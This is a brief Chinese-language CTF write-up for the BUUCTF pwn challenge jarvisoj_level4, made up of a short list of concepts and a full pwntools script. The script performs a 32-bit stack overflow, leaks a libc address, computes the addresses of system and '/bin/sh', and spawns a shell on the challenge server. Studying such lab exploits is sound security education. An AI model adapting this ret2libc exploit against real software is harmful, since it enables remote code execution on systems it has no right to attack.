---
title: "BUUCTF Pwn Jarvisoj_level4"
date: 2020-04-15T18:39:32+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_level4

考点

1、32位栈溢出

2、leak地址，计算基地址，计算libc函数地址

3、ret2libc3

buuctf平台给出了libc版本，但是本题原本是没有libc的，这里可以使用LibcSearcher或者pwntools自带的DynELF来计算libc中函数的偏移

![image-20200415184624444](/images/image-20200415184624444.png)

![image-20200415184410796](/images/image-20200415184410796.png)

```python
#!/usr/bin/env python2
#-*- cofing=UTF-8 -*-
from pwn import *
context.log_level = 'debug'
#sh = process('./jarvisoj_level4')
sh = remote('node3.buuoj.cn',28460)
elf = ELF('./jarvisoj_level4')
libc = ELF('./ubuntu16-x86-libc-2.23.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.symbols['main']

fakerebp = 0x4
offset = 0x88 + fakerebp

payload1 = 'a'*offset + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
sh.sendline(payload1)
write_addr = u32(sh.recv(4))

base = write_addr - libc.symbols['write']
system_addr =  libc.symbols['system'] + base
binsh_addr = libc.search("/bin/sh").next() + base

payload2 = 'a'*offset + p32(system_addr) + 'dead' + p32(binsh_addr)
sh.sendline(payload2)
sh.sendline('cat flag')
sh.interactive()
```

![image-20200415184433661](/images/image-20200415184433661.png)